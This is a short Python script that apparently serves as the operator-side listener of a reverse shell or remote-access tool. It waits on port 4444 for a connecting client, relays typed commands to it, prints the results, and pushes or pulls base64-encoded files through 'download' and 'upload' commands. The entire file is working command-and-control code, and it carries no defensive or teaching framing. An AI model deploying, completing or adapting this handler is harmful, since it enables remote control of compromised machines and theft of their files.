import socket 
from colorama import Fore, Style, init
import json
import os
import base64

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "127.0.0.1"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

def send_json(conn, data):
    json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
    conn.send(json_data.encode())  # Encode to bytes before sending

def receive_json(conn):
    json_data = ""
    while True:
        try:
            json_data = json_data + conn.recv(1024).decode()  # Decode bytes to string
            return json.loads(json_data)  # Return full file till the end of string/dat
        except ValueError:
            continue

def write_file(path, content):
    with open(path, "wb") as file:  # WB for writable binary file
        file.write(base64.b64decode(content))
        return "[+] Download successful [+]"

def read_file(path):  # RB for readable binary file
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()  # Decode bytes to string

try:
    while True:
        # Receive the prompt from the client
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input()

        # Send the command to the client
        client_socket.sendall(command.encode("utf-8"))

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Receive the output from the client
        if command.startswith("download"):
            file_path = command.split(" ")[1]
            file_content = read_file(file_path)
            send_json(client_socket, ["download", file_path, file_content])
            print(Fore.WHITE + f"Downloading {file_path}...")
        elif command.startswith("upload"):
            file_path = command.split(" ")[1]
            content = receive_json(client_socket)
            response = write_file(file_path, content[2])  # File content at index 2
            print(Fore.WHITE + response)
        else:
            output = client_socket.recv(4096).decode("utf-8")
            print(Fore.WHITE + output)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
